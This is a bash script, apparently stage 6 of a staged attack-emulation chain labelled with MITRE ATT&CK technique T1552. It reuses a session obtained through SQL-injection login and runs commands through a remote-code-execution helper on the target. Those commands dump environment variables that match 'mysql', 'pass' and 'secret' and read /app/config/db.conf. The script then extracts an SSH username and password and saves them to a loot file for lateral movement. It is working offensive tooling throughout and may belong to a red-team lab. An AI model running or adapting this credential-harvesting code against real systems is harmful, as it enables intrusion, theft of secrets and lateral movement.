#!/bin/bash
# Stage 6 — Credential Access  (MITRE T1552 Unsecured Credentials)
# Harvest DB + internal-host creds from env vars and the on-disk config file.
source "$(dirname "$0")/lib.sh"
banner "STAGE 6 — CREDENTIAL ACCESS (T1552)"

[ -f "$COOKIE" ] || sqli_login || { err "need a session"; exit 1; }

log "Reading environment variables (T1552.001) ..."
rce "env | grep -iE 'mysql|pass|secret' || true" | tee "$LOOT/06-env.txt"

echo
log "Reading the on-disk datasource config (T1552.001) ..."
rce "cat /app/config/db.conf" | tee "$LOOT/06-db.conf"

# Extract the reused internal-host credential for lateral movement.
HARVEST_USER=$(grep -E '^\s*ssh_user' "$LOOT/06-db.conf" | awk -F'=' '{gsub(/ /,"",$2);print $2}')
HARVEST_PASS=$(grep -E '^\s*ssh_password' "$LOOT/06-db.conf" | awk -F'=' '{gsub(/ /,"",$2);print $2}')
if [ -n "$HARVEST_USER" ]; then
  ok "Harvested internal-host credential: ${HARVEST_USER} / ${HARVEST_PASS}"
  printf 'SSH_USER=%s\nSSH_PASS=%s\n' "$HARVEST_USER" "$HARVEST_PASS" > "$LOOT/creds.env"
  ok "Saved to $LOOT/creds.env (used by the lateral-movement stage)"
fi
